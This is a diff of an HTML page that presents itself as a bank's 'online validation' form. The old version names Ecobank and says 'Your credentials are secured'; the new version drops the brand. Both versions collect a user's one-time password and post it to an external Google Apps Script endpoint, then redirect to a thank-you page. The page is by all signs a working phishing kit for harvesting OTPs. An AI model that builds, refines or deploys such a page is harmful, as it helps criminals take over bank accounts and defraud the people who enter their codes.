@@ -1,182 +1,114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Validation OTP</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: linear-gradient(to bottom, #08143a, #0b1d4d);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      color: #fff;
-      overflow-x: hidden;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Validation</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    background: linear-gradient(to bottom, #08143a, #0b1d4d);
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+  }
 
-    /* Animated waves behind the form */
-    body::before, body::after {
-      content: "";
-      position: absolute;
-      width: 200%;
-      height: 200%;
-      top: -50%;
-      left: -50%;
-      background: radial-gradient(circle at 50% 50%, rgba(30,144,255,0.15), transparent 70%);
-      border-radius: 40%;
-      animation: wave 15s linear infinite;
-      z-index: 0;
-    }
-    body::after { animation-delay: 7.5s; }
-    @keyframes wave {
-      0% { transform: rotate(0deg) translate(0,0); }
-      50% { transform: rotate(180deg) translate(20px, 20px); }
-      100% { transform: rotate(360deg) translate(0,0); }
-    }
+  .header {
+    background: linear-gradient(135deg, #08143a, #0b1d4d);
+    width: 100%;
+    text-align: center;
+    padding: 40px 20px;
+    border-bottom-left-radius: 40px;
+    border-bottom-right-radius: 40px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+  }
+  .header h1 { margin: 0; font-size: 24px; }
+  .header p { margin: 8px 0 0; font-size: 14px; }
 
-    .header {
-      background: linear-gradient(135deg, #08143a, #0b1d4d);
-      color: #fff;
-      text-align: center;
-      width: 100%;
-      padding: 40px 20px;
-      border-bottom-left-radius: 40px;
-      border-bottom-right-radius: 40px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      z-index: 1;
-      position: relative;
-      transition: box-shadow 0.3s ease;
-    }
-    .header h1 { margin: 0; font-size: 22px; }
-    .header p { margin: 5px 0 0; font-size: 14px; }
+  .login-container {
+    background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+    width: 90%;
+    max-width: 400px;
+    margin-top: -30px;
+    padding: 30px 25px;
+    border-radius: 12px;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+    text-align: center;
+  }
 
-    .login-container {
-      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
-      color: #fff;
-      width: 90%;
-      max-width: 360px;
-      margin-top: -30px;
-      padding: 30px 25px;
-      border-radius: 12px;
-      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
-      backdrop-filter: blur(4px);
-      z-index: 2;
-      position: relative;
-    }
-    .login-container label {
-      display: block;
-      margin-bottom: 6px;
-      font-size: 14px;
-      color: #fff;
-    }
-    .login-container input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #274080;
-      border-radius: 6px;
-      font-size: 14px;
-      background-color: rgba(11,29,77,0.9);
-      color: #fff;
-    }
-    .login-container input::placeholder {
-      color: #ccc;
-    }
+  .login-container label { display: block; margin-bottom: 6px; font-size: 14px; color: #fff; }
+  .login-container input {
+    width: 100%; padding: 12px; margin-bottom: 16px;
+    border: 1px solid #274080; border-radius: 6px; font-size: 14px;
+    background-color: rgba(11,29,77,0.9); color: #fff;
+    transition: all 0.3s ease;
+  }
+  .login-container input:focus {
+    border-color: #1e90ff;
+    box-shadow: 0 0 8px rgba(30,144,255,0.6);
+    outline: none;
+  }
 
-    .button-group {
-      display: flex;
-      justify-content: space-between;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-    .button-group button {
-      flex: 1;
-      padding: 12px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(135deg, #1e90ff, #187bcd);
-      color: #fff;
-      transition: all 0.3s ease;
-    }
-    .button-group button:hover {
-      background: linear-gradient(135deg, #187bcd, #1560a3);
-      transform: scale(1.05);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-    }
-
-    .status {
-      text-align: center;
-      margin-bottom: 12px;
-      font-size: 14px;
-      color: #ccc;
-    }
-  </style>
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    background: linear-gradient(135deg, #1e90ff, #187bcd);
+    color: #fff;
+    transition: all 0.3s ease, transform 0.2s ease;
+  }
+  .btn:hover {
+    background: linear-gradient(135deg, #187bcd, #1560a3);
+    transform: scale(1.02);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+  }
+</style>
 </head>
 <body>
-  <div class="header">
-    <h1>ECOBANK ONLINE VALIDATION</h1>
-    <p>Enter your OTP to validate your account</p>
-  </div>
 
-  <div class="login-container">
-    <form id="otpForm">
-      <label for="validation_otp">Validation OTP</label>
-      <input type="text" id="validation_otp" name="validation_otp" placeholder="Enter OTP" required>
+<div class="header">
+  <h1>Validation OTP</h1>
+  <p>Enter your OTP to continue</p>
+</div>
 
-      <div class="status" id="status">Your credentials are secured.</div>
+<div class="login-container">
+  <form id="otpForm">
+    <label>Validation OTP</label>
+    <input type="text" name="validation_otp" placeholder="Enter your OTP" required>
+    <button type="submit" class="btn">VALIDATE →</button>
+  </form>
+</div>
 
-      <div class="button-group">
-        <button type="submit">VALIDATE →</button>
-      </div>
-    </form>
-  </div>
+<script>
+const scriptURL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
+const form = document.getElementById("otpForm");
 
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
-    const form = document.getElementById("otpForm");
-    const statusEl = document.getElementById("status");
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const formData = new FormData(form);
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      statusEl.textContent = "Submitting...";
-      statusEl.style.color = "#ccc";
+  try {
+    const response = await fetch(scriptURL, { method: "POST", body: formData });
+    const result = await response.text();
+    console.log("Server response:", result);
 
-      const formData = new FormData(form);
-
-      try {
-        const response = await fetch(scriptURL, { method: "POST", body: formData });
-        const text = await response.text();
-        console.log("Server response:", text);
-
-        let json;
-        try {
-          json = JSON.parse(text);
-        } catch (err) {
-          statusEl.textContent = "Invalid response: " + text;
-          statusEl.style.color = "#ff6666";
-          return;
-        }
-
-        if (json.result === "success") {
-          window.location.href = "thankyou.html"; // redirect to final thank you page
-        } else {
-          statusEl.textContent = "Submission failed: " + (json.message || text);
-          statusEl.style.color = "#ff6666";
-        }
-      } catch (err) {
-        console.error(err);
-        statusEl.textContent = "Network error. Try again.";
-        statusEl.style.color = "#ff6666";
-      }
-    });
-  </script>
+    if (result.includes("success")) {
+      window.location.href = "thankyou.html";
+    } else {
+      alert("Submission failed: " + result);
+    }
+  } catch (err) {
+    console.error("Error:", err);
+    alert("There was a network error. Please try again.");
+  }
+});
+</script>
 </body>
 </html>
